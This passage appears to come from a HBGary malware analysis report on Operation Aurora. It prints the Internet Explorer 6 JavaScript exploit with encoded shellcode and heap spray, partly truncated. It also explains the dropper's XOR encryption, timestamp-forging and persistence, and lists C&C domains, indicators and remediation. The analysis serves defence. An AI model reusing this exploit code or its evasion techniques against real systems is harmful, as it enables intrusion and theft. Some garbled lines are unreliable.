The exploit and payload\nvehicle consists of the following components:\n\n  - Javascript based exploit vector, known to exploit IE 6\n\n  - Shellcode component, embedded in the Javascript\n\n  - Secondary payload server that delivers a dropper\n\n  - The dropper itself, which only used once and then deleted\n\n  - The backdoor program which is decompressed from the dropper\n\nJ AVASCRIPT AND S HELLCODE\n\nThe JavaScript based attack vector associated with Operation Aurora was published in the public domain in early January\n2010. Microsoft details the vulnerability in Security Bulletin MS10-002. Internet Explorer 5.01, Internet Explorer 6,\nInternet Explorer 6 Service Pack 1, Internet Explorer 7, and Internet Explorer 8 (except Internet Explorer 6 for supported\neditions of Windows Server 2003) are affected. Exploit code analyzed by HBGary reveals that only Internet Explorer 6\nwas targeted during Operation Aurora. This vulnerability can be leveraged by attackers of varying skill levels due to the\npublic availability of the Metasploit module “ie_aurora.rb” . The exploit code used by the original attackers was quickly\nimproved and added to Metasploit thus greatly expanding the potential number of attackers and reliability of code.\n\nThe JavaScript performs a heap spray attack and injects the embedded shellcode described below. The JavaScript\nexploits the vulnerability in Internet Explorer by copying, releasing, and then referencing a Document Object Model\n(DOM) element.\n\n#### Javascript Exploit Code\n\n<html>\n<head>\n<script>\nvar sc =\nunescape(\"%u9090%u19eb%u4b5b%u3390%u90c9%u7b80%ue901%u0175%u66c3%u7bb9%u8004%u0b34%ue2d8%uebfa%ue805%uffe2%uffff%u3931%ud8db%u87\nd8%u79bc%ud8e8%ud8d8%u9853%u53d4%uc4a8%u5375%ud0b0%u2f53%ud7b2%u3081%udb59%ud8d8%u3a48%ub020%ueaeb%ud8d8%u8db0%ubdab%u8caa%u9e53\n%u30d4%uda37%ud8d8%u3053%ud9b2%u308\n**SECTION REMOVED FOR SPACE...**\n8%udfa7%ufa4a%uc6a8%ubc7c%u4b37%u3cea%u564c%ud2cb%ua174%u3ee1%u1c40%uc755%u8fac%ud5be%u9b27%u7466%u4003%uc8d2%u5820%u770e%u2342%\nucd8b%ub0be%uacac%ue2a8%uf7f7%ubdbc%ub7b5%uf6e9%uacbe%ub9a8%ubbbb%uabbd%uf6ab%ubbbb%ubcf7%ub5bd%uf7b7%ubcb9%ub2f6%ubfa8%u00d8\");\n\nvar sss = Array (826, 679, 798, 224, 770, 427, 819, 770, 707, 805, 693, 679, 784, 707, 280,\n238, 259, 819, 336, 693, 336, 700, 259, 819, 336, 693, 336, 700, 238, 287, 413, 224, 833,\n**SECTION REMOVED FOR SPACE...**\n735, 427, 336, 413, 735, 420, 350, 336, 336, 413, 735, 301, 301, 287, 224, 861, 840, 637,\n735, 651, 427, 770, 301, 805, 693, 413, 875);\n\nvar arr = new Array;\nfor (var i = 0; i < sss.length; i ++) {\narr[i] = String.fromCharCode (sss [i] / 7);\n}\n\nvar cc = arr.toString ();\ncc = cc.replace (/,/g, \"\");\ncc = cc.replace (/@/g, \",\");\neval (cc);\n\nvar x1 = new Array ();\nfor (i = 0; i < 200; i ++) {\nx1 [i] = document.createElement (\"COMMENT\");\nx1 [i].data = \"abc\";\n};\n\nvar e1 = null;\n\nfunction ev1 (evt)\n{\ne1 = document.createEventObject (evt);\ndocument.getElementById (\"sp1\").innerHTML = \"\";\nwindow.setInterval (ev2, 50);\n}\n\nfunction ev2 ()\n{\np = \"\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u\n0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0\n\n\n-----\n\nd\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\";\nfor (i = 0; i < x1.length; i ++) {\nx1 [i].data = p;\n};\nvar t = e1.srcElement;\n}\n</script>\n</head>\n<body>\n<span id=\"sp1\"><IMG SRC=\"aaa.gif\" onload=\"ev1(event)\" width=\"16\" height=\"16\"></span>\n</body>\n</html>\n#### JavaScript Artifacts Pattern\n\nInitial encrypted dropper download.

Note: these files are specific to the sample we analyzed at\n**_HBGary, Inc. The attackers must use a second stage download mechanism to achieve full system access due to memory_**\nconstraints. It is unlikely that the final payload could be delivered through the original exploit given these conditions.\nThe dropper is XOR encrypted with a 0x95 key. The shellcode copies this encrypted binary to the user’s AppData\ndirectory as “a.exe”. The shellcode then decrypts “a.exe” and moves it to “b.exe” in the same directory. Then “b.exe” is\nexecuted.

The initial dropper is likely to be packed (UPX, etc). The dropper has an embedded\nDLL that is decompressed to the windows system32 directory. This DLL will be named to resemble existing services\n(rasmon.dll, etc). In order to evade forensics, the file-time of the dropped DLL will be modified to match that of an\nexisting system DLL (user32.dll, etc). The dropped DLL is loaded into its own svchost.exe process. Several\nregistry keys are created and then deleted as part of this process. Finally, the dropper deletes itself from the system by\nusing a dissolving batch file (DFS.BAT, etc).\n\n#### Actionable Intelligence Pattern\nService Key & Value SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\\n_Note: deleted after drop_ **Value: SysIns Data: Ups???

Once executing, the payload will immediately delete the first **buffer after phase one XOR:**\n\nmJ2bhcPExs7excLThcjExqurnauYq\n\nservice and enter stage-two.

ÃÄÆÎÞÅÂÓ…ÈÄÆ«« «˜«Ÿ«“«†«š«š«ž«š«œ\nThis new service will point to the same backdoor DLL, no new files are involved.\n_Note: the three character prefixes Ups and RaS can easily be modified by the attacker._\nOnce the new service is registered, the payload will access an embedded resource\nthat is encrypted. The decryption goes through several phases. The encrypted data block contains the DNS name for\nthe command and control server (homeunix.com, etc). **This data block is configurable before the malware is**\n**deployed. The data block length is hard-coded (0x150 or 336 bytes). During phase one, this data block is fed through a**\nsimple XOR (0x99), resulting in an ASCII-string. Next, the resulting ASCII-string is fed into a base64 decoding\nfunction, producing a binary string. Finally, the resulting base64 decoded binary string is fed through another XOR\n(0xAB), resulting in clear-text. The three primary encryption loops are colored and marked in Figure 1. The resulting\nclear-text buffer contains several fields in both ASCII and UNICODE, including the C&C server address.\n\n#### Actionable Intelligence Pattern\n\n\nC&C Server DNS *.homeunix.com (where * is any subdomain)\n*.homelinux.com\n*.ourhobby.com\n*.3322.org\n*.2288.org\n*.8866.org\n*.ath.cx\n*.33iqst.com\n*.dyndns.org\n*.linode.com\n*.ftpaccess.cc\n*.filoups.info\n*.blogsite.org\n\nThe payload will create additional registry keys.\n#### Actionable Intelligence Pattern\nAdditional Key HKLM\\Software\\Sun\\1.1.2\\IsoTp\n\nAdditional Key HKLM\\Software\\Sun\\1.1.2\\AppleTlk\n\n\n-----\n\nOther potential dropped files, as reported by McAfee:\n#### Actionable Intelligence Pattern\nAdditional File securmon.dll\n\nAdditional File AppMgmt.dll\n\nAdditional File A0029670.dll (A00#####.dll)\n\nAdditional File msconfig32.sys\n\nAdditional File VedioDriver.dll\n\nAdditional File acelpvc.dll\n\nAdditional File wuauclt.exe\n\nAdditional File jucheck.exe\n\nAdditional File AdobeUpdateManager.exe\n\nAdditional File zf32.dll\n\nC OMMAND AND CONTROL\n\nThe payload communicates with its command and control server over port 443. The source port is randomly selected.\nWhile outbound traffic appears to be HTTPS, the actual traffic uses a weak custom encryption scheme. The command\nand control packets have a very specific format[iv].\n\ncommand parameters 0x00000001 payload len CRC KEY payload\n\nThe payload section is encrypted with a key selected by using GetTickCount. This means each infected node has its\nown key. The key is embedded in the header of the packet, and is easily recovered.\n\n# DIAGNOSE\n\nH OW THE MALWARE WORKS\n\nThe primary control logic can be found in the module registered under the service key (rasmon.dll, etc.). This module has\nbeen written in c and includes several specific methods and encodings that provide\nforensic track-ability.\n\nThe above screenshot illustrates a REcon(tm) trace on the malware dropper and\nsubsequent service creation. Location A. represents the dropper program, which unpacks\nitself and decompresses a file to the system32 directory. Point B. represents the initial\nsvchost.exe startup, which is loading the malware payload. Location C. is the actual\nexecution of the malware service, which remains persistent. At points E. and F. you can\nsee the malware checking in with the command and control server. Finally, location D.\nrepresents the dissolvable batch file which deletes the initial dropper and then itself.\n\n**FIGURE 1** **- BASE64 AND XOR**\n\n|command|parameters|0x00000001|payload len|CRC|KEY|payload|\n|---|---|---|---|---|---|---|\n\n\n-----\n\n**FIGURE 2** **-** **C&C** **COMMAND PARSER**\n\n\nC APABILITY\n\nThe malware has generic and flexible capabilities. There are distinct command\nhandlers in the malware that allow files to be stolen and remote commands to\nbe executed. The command handler is illustrated in Figure 2. At location A. the\ncommand number is checked. At locations marked B. are each individual\ncommand handler, as controlled by the C&C server and command number in\nthe C&C packet.

Detection of the\nmalware is covered in detail, from multiple aspects, in the Detect section above. When using a Digital DNA(tm) capable\nplatform such as McAfee ePO, Guidance EnCase Enterprise, or Verdasys Digital Guardian, you can search the Enterprise\nfor the following Digital DNA sequence (recommend a tight match, 90% or higher).\n\n#### Digital DNA Sequence for Aurora Malware 01 B4 EE 00 AE DA 00 8C 16 00 89 22 00 46 73 00 C6 49 00 0B AE 01 E7 9F 04 05 81 01 0E DF 01 79 D8 00 25 6A 00 15 49 00 47 22 00 4B 67 0F 2D CC 01 29 67 01 35 99\n\nTo thwart command and control and prevent data loss, known C&C domains should be blocked at the egress firewall.\nThe domains listed in the Detect section represent a significant set of those currently known to be operating. IDS\nsignatures similar to the one illustrated in the Detect section should be used to detect inbound exploit attempts, and\nmachines accepting this data should be scanned for potential infections. Many A/V products now contain signatures for\nthe Aurora exploit and will be effective in detection and removal. However, the attackers that represent the threat will\nnot be deterred, and variants of the attack are nearly assured.\n\n#### Factors Description\nC&C protocol If a variant is developed, it will very likely use the same C&C protocol, but\nmay change the header of the packet and the constants used for connection\nsetup. This will evade IDS / Firewall rules designed to detect the current\nscheme. It is unlikely the attackers will change the encryption setup,\nhowever.\nInstallation and Deployment The method used to install the service is highly effective. Although the\nfilenames will likely change, the actual method will likely remain.\n\nI NOCULATION S HOT\n\nHBGary has prepared an inoculation shot for this malware. The inoculation shot is a small, signed binary\nthat will allow you to scan for, and optionally remove, this malware from your Enterprise network.\n\n#### Remediation and Prevention with the HBGary Inoculation Shot\n\nThe AuroraInnoculation.exe is a simple WMI-based utility for scanning windows-based machines for the presence of the Aurora APT malware package.\nThe aurora innoculator also has the option of automatically removing a discovered infection and rebooting the box automatically. When the aurora\ninnoculator is executed it will query the user for authentication credentials. Optionally the user can just hit \"cancel\" to use the currently logged on\nUSER's authentication token.
